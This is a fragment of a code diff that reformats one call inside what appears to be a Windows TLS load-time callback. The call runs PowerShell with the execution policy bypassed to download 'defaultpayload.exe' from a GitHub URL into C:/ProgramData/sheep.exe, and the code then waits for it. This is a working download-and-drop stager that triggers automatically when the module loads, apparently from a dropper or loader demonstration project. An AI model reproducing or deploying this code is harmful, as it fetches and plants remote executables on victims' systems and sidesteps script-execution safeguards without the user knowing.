@@ -121,7 +121,18 @@ void NTAPI callback(PVOID dllHandle, DWORD reason, PVOID reserved)
    
    if (getFileAttributes(sheep) == INVALID_FILE_ATTRIBUTES)
    {
-      if (!createProcess(NULL, "powershell -ExecutionPolicy bypass -Command \"(New-Object System.Net.WebClient).DownloadFile('https://github.com/frank2/blenny/raw/main/res/defaultpayload.exe', 'C:/ProgramData/sheep.exe')\"", NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info))
+      if (!createProcess(NULL,
+                         "powershell -ExecutionPolicy bypass "
+                         "-Command \"(New-Object System.Net.WebClient).DownloadFile("
+                         "'https://github.com/frank2/blenny/raw/main/res/defaultpayload.exe', 'C:/ProgramData/sheep.exe')\"",
+                         NULL,
+                         NULL,
+                         FALSE,
+                         0,
+                         NULL,
+                         NULL,
+                         &startup_info,
+                         &proc_info))
          return;
 
       if (waitForSingleObject(proc_info.hProcess, INFINITE) != WAIT_OBJECT_0)
